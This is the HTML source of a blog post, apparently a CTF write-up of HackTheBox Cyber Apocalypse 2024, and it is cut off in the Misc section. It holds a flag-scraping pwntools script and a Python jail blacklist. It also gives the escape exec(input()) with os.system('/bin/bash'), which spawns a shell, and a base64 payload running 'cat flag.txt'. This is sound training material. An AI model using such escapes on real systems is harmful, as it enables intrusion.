@@ -1,0 +1,2927 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="HTB Cyber Apocalypse was my favorite CTF competition of 2023, and once again it did not disappoint! I had a blast, and the Forensics category is quickly becoming my new favorite. Our team placed 120th place, 2 positions lower from last year, but overall I felt we had a great showing! The competition was notably stronger than last year, and placing in the top ~3% is still quite great.">
+<title>HackTheBox - Cyber Apocalypse: 2024</title>
+
+<link rel='canonical' href='http://localhost:1313/p/hackthebox-cyber-apocalypse-2024/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="HackTheBox - Cyber Apocalypse: 2024">
+<meta property='og:description' content="HTB Cyber Apocalypse was my favorite CTF competition of 2023, and once again it did not disappoint! I had a blast, and the Forensics category is quickly becoming my new favorite. Our team placed 120th place, 2 positions lower from last year, but overall I felt we had a great showing! The competition was notably stronger than last year, and placing in the top ~3% is still quite great.">
+<meta property='og:url' content='http://localhost:1313/p/hackthebox-cyber-apocalypse-2024/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Misc' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='Forensics' /><meta property='article:published_time' content='2024-03-16T13:16:33-05:00'/><meta property='article:modified_time' content='2024-03-16T13:16:33-05:00'/><meta property='og:image' content='http://localhost:1313/p/hackthebox-cyber-apocalypse-2024/ca-2024-ctf-background.jpg' />
+<meta name="twitter:title" content="HackTheBox - Cyber Apocalypse: 2024">
+<meta name="twitter:description" content="HTB Cyber Apocalypse was my favorite CTF competition of 2023, and once again it did not disappoint! I had a blast, and the Forensics category is quickly becoming my new favorite. Our team placed 120th place, 2 positions lower from last year, but overall I felt we had a great showing! The competition was notably stronger than last year, and placing in the top ~3% is still quite great."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/p/hackthebox-cyber-apocalypse-2024/ca-2024-ctf-background.jpg' />
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu897059592634026878.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#misc">Misc</a>
+      <ol>
+        <li><a href="#character">Character</a></li>
+        <li><a href="#unbreakable">Unbreakable</a></li>
+        <li><a href="#multidigilingual">MultiDigilingual</a></li>
+      </ol>
+    </li>
+    <li><a href="#web">Web</a>
+      <ol>
+        <li><a href="#timekorp">TimeKORP</a></li>
+        <li><a href="#korp-terminal">KORP Terminal</a></li>
+        <li><a href="#flag-command">Flag Command</a></li>
+        <li><a href="#testimonial">Testimonial</a></li>
+        <li><a href="#locktalk">LockTalk</a></li>
+      </ol>
+    </li>
+    <li><a href="#forensics">Forensics</a>
+      <ol>
+        <li><a href="#urgent">Urgent</a></li>
+        <li><a href="#an-unusual-sighting">An Unusual Sighting</a></li>
+        <li><a href="#fake-boost">Fake Boost</a></li>
+        <li><a href="#phreaky">Phreaky</a></li>
+        <li><a href="#data-siege">Data Siege</a>
+          <ol>
+            <li><a href="#decrypted-message-1">Decrypted Message 1:</a></li>
+            <li><a href="#decrypted-message-2">Decrypted Message 2:</a></li>
+            <li><a href="#decrypted-message-3">Decrypted Message 3:</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/hackthebox-cyber-apocalypse-2024/">
+                <img src="/p/hackthebox-cyber-apocalypse-2024/ca-2024-ctf-background_hu11911258351037064811.jpg"
+                        srcset="/p/hackthebox-cyber-apocalypse-2024/ca-2024-ctf-background_hu11911258351037064811.jpg 800w, /p/hackthebox-cyber-apocalypse-2024/ca-2024-ctf-background_hu10661289119964198587.jpg 1600w"
+                        width="800" 
+                        height="450" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Cyber Apocalypse: 2024" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/hackthebox-cyber-apocalypse-2024/">HackTheBox - Cyber Apocalypse: 2024</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            HTB Cyber Apocalypse was my favorite CTF competition of 2023, and once again it did not disappoint! I had a blast, and the Forensics category is quickly becoming my new favorite. Our team placed 120th place, 2 positions lower from last year, but overall I felt we had a great showing! The competition was notably stronger than last year, and placing in the top ~3% is still quite great.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 16, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    34 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="misc">Misc
+</h2><h3 id="character">Character
+</h3><p>Difficulty: Very Easy</p>
+<blockquote>
+<p>Security through Induced Boredom is a personal favourite approach of mine. Not as exciting as something like The Fray, but I love making it as tedious as possible to see my secrets, so you can only get one character at a time!</p>
+</blockquote>
+<hr>
+<p>When we use <code>nc</code> to connect to the service, we are asked for an index input. Providing a number prints out 1 character of the flag:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ nc 94.237.62.83 59504
+</span></span><span class="line"><span class="cl">Which character (index) of the flag do you want? Enter an index: 0
+</span></span><span class="line"><span class="cl">Character at Index 0: H
+</span></span><span class="line"><span class="cl">Which character (index) of the flag do you want? Enter an index: 1
+</span></span><span class="line"><span class="cl">Character at Index 1: T
+</span></span><span class="line"><span class="cl">Which character (index) of the flag do you want? Enter an index: 90
+</span></span><span class="line"><span class="cl">Character at Index 90: _
+</span></span><span class="line"><span class="cl">Which character (index) of the flag do you want? Enter an index: 111
+</span></span><span class="line"><span class="cl">Index out of range!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As we can see, the flag is really long. I determine the last index to be 103, meaning it is 104 characters long! Retrieving the flag by hand will be extremely tedious, so I use a python script to retrieve the letters and assemble them:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;94.237.62.83&#39;</span><span class="p">,</span> <span class="mi">59504</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">flagchars</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="n">flagindex</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">flagend</span> <span class="o">=</span> <span class="mi">104</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Start game 1 and chain</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">flagindex</span><span class="p">,</span> <span class="n">flagend</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Enter an index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">flagindex</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flagchars</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvS</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flagindex</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flagchars</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flagchars</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The process is very simple: we wait for the server to respond back after connecting (&ldquo;Enter an index: &ldquo;), then we send our flag index location beginning 0. We receive a character at index X, and separate it with the &ldquo;: &quot; text immediately prior to our character. recvS(1) to pick up the letter and append it to our list of chars. Increase index to move on to the next letter, and after the for loop is complete then we print the full character list:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python3 ans.py 
+</span></span><span class="line"><span class="cl">[+] Opening connection to 94.237.62.83 on port 59504: Done
+</span></span><span class="line"><span class="cl">H
+</span></span><span class="line"><span class="cl">T
+</span></span><span class="line"><span class="cl">B
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">HTB{tH15_1s_4_r3aLly_l0nG_fL4g_i_h0p3_f0r_y0Ur_s4k3_tH4t_y0U_sCr1pTEd_tH1s_oR_els3_iT_t0oK_qU1t3_l0ng!!}
+</span></span><span class="line"><span class="cl">[*] Closed connection to 94.237.62.83 port 59504
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Printing the characters as I received them made the output very long and ugly, but we retrieve the flag!</p>
+<h3 id="unbreakable">Unbreakable
+</h3><p>Difficulty: Easy</p>
+<blockquote>
+<p>Think you can escape my grasp? Challenge accepted! I dare you to try and break free, but beware, it won&rsquo;t be easy. I&rsquo;m ready for whatever tricks you have up your sleeve!</p>
+</blockquote>
+<hr>
+<p>The challenge consists of a python file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span> <span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;os&#39;</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;`&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">              <span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="s1">&#39;!&#39;</span><span class="p">,</span> <span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="s1">&#39;import&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">              <span class="s1">&#39;eval&#39;</span><span class="p">,</span> <span class="s1">&#39;banner&#39;</span><span class="p">,</span> <span class="s1">&#39;echo&#39;</span><span class="p">,</span> <span class="s1">&#39;cat&#39;</span><span class="p">,</span> <span class="s1">&#39;%&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">              <span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">,</span> <span class="s1">&#39;4&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">              <span class="s1">&#39;5&#39;</span><span class="p">,</span> <span class="s1">&#39;6&#39;</span><span class="p">,</span> <span class="s1">&#39;7&#39;</span><span class="p">,</span> <span class="s1">&#39;8&#39;</span><span class="p">,</span> <span class="s1">&#39;9&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">              <span class="s1">&#39;lower&#39;</span><span class="p">,</span> <span class="s1">&#39;upper&#39;</span><span class="p">,</span> <span class="s1">&#39;system&#39;</span><span class="p">,</span> <span class="s1">&#39;}&#39;</span><span class="p">,</span> <span class="s1">&#39;{&#39;</span> <span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">ans</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;Break me, shake me!</span><span class="se">\n\n</span><span class="s1">$ &#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">char</span> <span class="ow">in</span> <span class="n">ans</span> <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="se">\n</span><span class="si">{</span><span class="n">banner1</span><span class="si">}</span><span class="se">\n</span><span class="s1">Naughty naughty..</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">eval</span><span class="p">(</span><span class="n">ans</span> <span class="o">+</span> <span class="s1">&#39;()&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;WHAT WAS THAT?!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="si">{</span><span class="n">banner2</span><span class="si">}</span><span class="se">\n</span><span class="s2">I&#39;m UNBREAKABLE!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>For brevity, I snipped out the ASCII art. This is clearly a python jail exercise, with a somewhat thorough blacklist. The list is missing a very important function in <code>exec</code>, but I also notice that <code>input</code> is excluded as well. Oftentimes, we can bypass blacklist checks by sending input(), then the content will be treated as stdin. By combining these, I can create a shell session:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">I&#39;m UNBREAKABLE!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Break me, shake me!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ exec(input())
+</span></span><span class="line"><span class="cl">import os; os.system(&#34;/bin/bash&#34;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">flag.txt
+</span></span><span class="line"><span class="cl">main.py
+</span></span><span class="line"><span class="cl">cat flag.txt
+</span></span><span class="line"><span class="cl">HTB{3v4l_0r_3vuln??}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After performing exec(input()), we supply our jail escape command: <code>import os; os.system(&quot;/bin/bash&quot;)</code>. After pressing enter, we have an interactive shell! I confirm this with <code>id</code>, before printing the flag.</p>
+<h3 id="multidigilingual">MultiDigilingual
+</h3><p>Difficulty: Hard</p>
+<blockquote>
+<p>It&rsquo;s a known secret that each faction speaks different languages, however few can speak all of them. KORP has long wanted to send a spy in the factions to keep an eye on them. Through their extensive network, they have found different talented factionless to test. The first to show their multidigilingual skills will get a place in them, and be their secret agent amongst the factions. Can you show them your worth?</p>
+</blockquote>
+<hr>
+<p>This was a tough nut to crack, but I had a very satisfying unintended solution to it. We are provided no source code, only an instanced address/port:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ nc 94.237.56.46 39938
+</span></span><span class="line"><span class="cl">****************************************
+</span></span><span class="line"><span class="cl">*   How many languages can you talk?   *
+</span></span><span class="line"><span class="cl">* Pass a base64-encoded program that&#39;s *
+</span></span><span class="line"><span class="cl">*   all of the below that just reads   *
+</span></span><span class="line"><span class="cl">*      the file `flag.txt` to win      *
+</span></span><span class="line"><span class="cl">*          and pass the test.          *
+</span></span><span class="line"><span class="cl">*                                      *
+</span></span><span class="line"><span class="cl">*              Languages:              *
+</span></span><span class="line"><span class="cl">*               * Python3              *
+</span></span><span class="line"><span class="cl">*               * Perl                 *
+</span></span><span class="line"><span class="cl">*               * Ruby                 *
+</span></span><span class="line"><span class="cl">*               * PHP8                 *
+</span></span><span class="line"><span class="cl">*               * C                    *
+</span></span><span class="line"><span class="cl">*               * C++                  *
+</span></span><span class="line"><span class="cl">*                                      *
+</span></span><span class="line"><span class="cl">*   Succeed in this and you will be    *
+</span></span><span class="line"><span class="cl">*               rewarded!              *
+</span></span><span class="line"><span class="cl">****************************************
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Enter the program of many languages:
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see the challenge here: we are to provide a code block in base64 format that will be accepted in all languages and output the contents of flag.txt. After submitting something, we see that it is checking python execution before moving on to perl, likely down the list of languages presented:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Enter the program of many languages: aW1wb3J0IG9zCm9zLnN5c3RlbSgnY2F0IGZsYWcudHh0Jyk=
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Executing Python3 using command python
+</span></span><span class="line"><span class="cl">    [+] Completed. Checking output
+</span></span><span class="line"><span class="cl">    [+] Passed the check
